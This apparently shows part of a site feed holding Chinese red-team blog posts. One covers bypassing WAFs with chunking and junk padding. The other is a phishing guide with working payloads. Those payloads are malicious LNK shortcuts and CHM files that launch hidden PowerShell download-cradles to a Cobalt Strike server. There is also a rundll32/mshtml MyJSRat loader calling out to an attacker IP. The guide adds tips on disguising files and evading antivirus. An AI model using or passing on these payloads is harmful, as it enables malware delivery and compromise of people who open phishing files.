+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E9%98%9F%E6%94%BB%E5%87%BB-%E7%BB%95%E8%BF%87waf%E4%BB%A5%E5%8F%8AIDS%E7%AD%89%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87/640.png" alt="图片"></p>
+<p>分包后</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E9%98%9F%E6%94%BB%E5%87%BB-%E7%BB%95%E8%BF%87waf%E4%BB%A5%E5%8F%8AIDS%E7%AD%89%E6%B5%81%E9%87%8F%E8%AE%BE%E5%A4%87/640-16544969262461.png" alt="图片"></p>
+<p>此方法主要是把一些关键字给拆开，当然你也可以通过手动编码进行调整，编码过程中长度需包括空格的长度，最后用0表示编码结束。</p>
+<p><strong>8.2 延时分块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">详情参考</span><br><span class="line">https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/</span><br></pre></td></tr></table></figure>
+
+<p><strong>9.垃圾数据</strong></p>
+<p>遇到什么waf，都是大包绕，绕不过，那就是包不够大，继续填充！！</p>
+<p>并不是随意填充垃圾数据，而是填一些不影响结果的数据，比如遇到php站</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post参数为username=admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>那么填充垃圾数据可为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&amp;username=admin&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>填充到waf不再拦截为止。</p>
+<p>还有通过语言的注释语句填充，例如如果是xml 上传，则可以使用xml中的注释语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把这样的语法放在payload前面，填充到bypass waf为止</p>
+<p>如果是反序列化包，可以参考这篇文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>RedTeam</category>
+      </categories>
+      <tags>
+        <tag>Bypass</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红蓝对抗之钓鱼篇：常见钓鱼思路总结</title>
+    <url>/posts/212af6cb.html</url>
+    <content><![CDATA[<blockquote>
+<p>转载自：<a href="https://mp.weixin.qq.com/s/56emHdTpCZyRaGXv1LTIGA">https://mp.weixin.qq.com/s/56emHdTpCZyRaGXv1LTIGA</a></p>
+</blockquote>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、文档连接钓鱼</span><br><span class="line">  1）LINK链接钓鱼</span><br><span class="line">  2）LINK快捷方式钓鱼</span><br><span class="line">  3）CHM文档钓鱼</span><br><span class="line">  CHM文档bypass waf</span><br><span class="line">  4）HTA钓鱼</span><br><span class="line">  5）宏钓鱼</span><br><span class="line">  宏钓鱼 bypass waf</span><br><span class="line">  6）OLE（Object Linking and Embedding，对象链接与嵌入）</span><br><span class="line">  7）嵌入JS元素</span><br><span class="line">  8）利用模板文件注入宏指令</span><br><span class="line">  9）CVE</span><br><span class="line">2、伪造界面钓鱼</span><br><span class="line">  1）PPT动作按钮特性构造 PPSX 钓鱼</span><br><span class="line">3、exe等可执行文件</span><br><span class="line">  1）shellcode 异或加密免杀（golang）</span><br><span class="line">  2）shellcode转换免杀</span><br><span class="line">  3）shellcode编译免杀</span><br><span class="line">  4）shellcode分离加载免杀</span><br><span class="line">  5）绕过沙盒</span><br><span class="line">  6）exe伪装</span><br><span class="line">  7）绕过行为检测</span><br><span class="line">  8）DLL劫持+重新制作安装包</span><br><span class="line">  9）免杀思路</span><br><span class="line">4、邮件钓鱼</span><br><span class="line">5、flash钓鱼</span><br><span class="line">6、网站钓鱼</span><br></pre></td></tr></table></figure>
+
+<h2 id="1、文档连接钓鱼"><a href="#1、文档连接钓鱼" class="headerlink" title="1、文档连接钓鱼"></a>1、文档连接钓鱼</h2><h3 id="1）LINK链接钓鱼"><a href="#1）LINK链接钓鱼" class="headerlink" title="1）LINK链接钓鱼"></a>1）LINK链接钓鱼</h3><p>首先说明一点：ftp加! 可以执行命令</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640.jpeg" alt="图片"></p>
+<p>首先创建一个ftp的快捷方式，然后新建一个文件名 aaa.dll ，然后内容为cs的后门恶意链接（powershell上线命令）</p>
+<p>快捷方式的起始位置留空，目标为：C:\Winodws\System32\ftp.exe -“”s:aaa.dll</p>
+<p>快捷方式的图标以及名字可以进行适当的伪装</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005532.jpeg" alt="图片"></p>
+<p>这里演示一下生成后门恶意链接</p>
+<p>运行CS，根据图片点击：Scripted Wed Delivery(s)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005633.jpeg" alt="图片"></p>
+<p>主机地址为CS服务器端地址，监听使用之前的监听就可以，然后执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005634.jpeg" alt="图片"></p>
+<p>这里就创建好了一个 powershell 的回连恶意链接 复制即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005635.jpeg" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是如果直接第三方调用powershell加参的话会被360等拦截，所以要采用无参调用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005736.jpeg" alt="图片"></p>
+<h3 id="2）LINK快捷方式钓鱼"><a href="#2）LINK快捷方式钓鱼" class="headerlink" title="2）LINK快捷方式钓鱼"></a>2）LINK快捷方式钓鱼</h3><p>此方式与上述方式类似</p>
+<p>首先查找后门绝对路径，可以提权后门的有很多文件，这里以 powershell.exe 进行演示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005737.jpeg" alt="图片"></p>
+<p>打开目录，找到路径为：</p>
+<p>C:\Windows\System32\WindowsPowerShell\v1.0</p>
+<p>生成后门恶意链接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005633.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005634.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005635.jpeg" alt="图片"></p>
+<p>创建 lnk 创建方式</p>
+<p>将powershell恶意代码放入进行修改，将代码最前端添加绝对路径</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005738.jpeg" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c &quot;IEX ((new- object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里免杀的话，使用base64等等进行混淆</p>
+<p>然后对该文件右键选择进行创建快捷方式，对快捷方式右键选择属性，在目标写入恶意回弹代码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005739.jpeg" alt="图片"></p>
+<p>可以对图标和名称进行适当的更改，之后就可以开始钓鱼了</p>
+<h3 id="3）CHM文档钓鱼"><a href="#3）CHM文档钓鱼" class="headerlink" title="3）CHM文档钓鱼"></a>3）CHM文档钓鱼</h3><p>使用 EasyCHM 可以轻松的新建一个 chm 文件</p>
+<p>EasyCHM、Cobalt Strike、MyJSRat 钓鱼流程：制作html -&gt; 制作chm文件 -&gt; 伪装 -&gt; 打开chm上线</p>
+<p>首先创建个空文件夹</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005840.jpeg" alt="图片"></p>
+<p>创建html文件，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,calc.exe&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005841.jpeg" alt="图片"></p>
+<p>注意：”,payload”，上面代码中为”,calc.exe”，此处，payload前面要加一个英文版的逗号，，否则打开chm文档时会出错</p>
+<p>此处打开文档执行的calc，也就是计算器</p>
+<p>Easy CHM制作CHM文档</p>
+<p>新建工程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005842.jpeg" alt="图片"></p>
+<p>工程目录选择我们建立的test文件夹（html文件放在文件夹内）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005943.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005944.jpeg" alt="图片"></p>
+<p>点击编译 生成CHM</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005945.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332005946.jpeg" alt="图片"></p>
+<p>双击打开查看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006047.jpeg" alt="图片"></p>
+<p>弹出计算机</p>
+<p>尝试使用 Cobalt Strike 木马 + CHM 上线</p>
+<p>Cobalt Strike -&gt; 点击attacks -&gt; web Drive by -&gt; scriped web Delivery</p>
+<p>上文有详细步骤</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006048.jpeg" alt="图片"></p>
+<p>设立好监听点击开始</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006049.jpeg" alt="图片"></p>
+<p>然后将 calc.exe 替换为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/test&#x27;))&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006050.jpeg" alt="图片"></p>
+<p>注意：exe后面要再加一个英文版逗号，否则无法执行exe，再是注意生成出来的payload字符串的双引号跟单引号的冲突</p>
+<p>再重新生成，查看是否上线</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006051.jpeg" alt="图片"></p>
+<p>MyJSRat配合CHM进行上线</p>
+<p>MyJSRat下载地址：<a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a></p>
+<p>python2运行下面的命令：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006052.jpeg" alt="图片"></p>
+<p>此处使用交互模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 MyJSRat.py -i 192.168.27.180 -p 8080</span><br></pre></td></tr></table></figure>
+
+<p>Kali Linux 运行访问</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006153.jpeg" alt="图片"></p>
+<p>复制代码替换payload，记得加上逗号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Mousejack replay&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item1&quot; value=&#x27;,rundll32.exe, javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.27.180:8081/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);&#125;&#x27;&gt;</span><br><span class="line">&lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后重新生成CHM并且执行</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006154.jpeg" alt="图片"></p>
+<p>在kali上可以进行命令交互</p>
+<p><strong>CHM内容伪装</strong></p>
+<p>先拿一个正常的CHM文档内容，转为html</p>
+<p>通过hh命令，转为html</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hh -decompile .[\\html](file://html) CSS2.0中文手册.chm</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006155.jpeg" alt="图片"></p>
+<p>钓鱼html嵌入到 html&#x2F;css2&#x2F;c_color.html</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006156.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
+<p>工程目录选择css2</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006157.jpeg" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006258.jpeg" alt="图片"></p>
+<p>注意此处，一定要诱导用户点击到 c_color.html 模块才可以</p>
